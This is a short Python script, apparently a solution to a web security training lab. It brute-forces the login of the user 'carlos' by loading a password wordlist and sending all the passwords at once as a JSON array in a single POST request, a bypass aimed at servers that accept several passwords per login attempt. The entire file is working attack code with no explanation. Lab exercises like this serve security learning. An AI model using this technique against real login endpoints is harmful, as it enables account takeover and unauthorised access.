import requests
import os

def get_password_wordlist() -> list[str]:
    script_dir = os.path.dirname(os.path.abspath(__file__))
    parent_dir = os.path.dirname(script_dir)
    passwords_path = os.path.join(parent_dir, '../wordlists', 'passwords.txt')
    with open(passwords_path, 'r') as f:
        return f.read().splitlines()
    

def solve_lab():
    LAB_URL = input("Enter the lab URL: ")
    passwords = get_password_wordlist()

    data = {
        "username": "carlos",
        "password": []
    }

    for password in passwords:
        data["password"].append(password)
        
    r = requests.post(f"{LAB_URL}/login", json=data)
    
solve_lab()
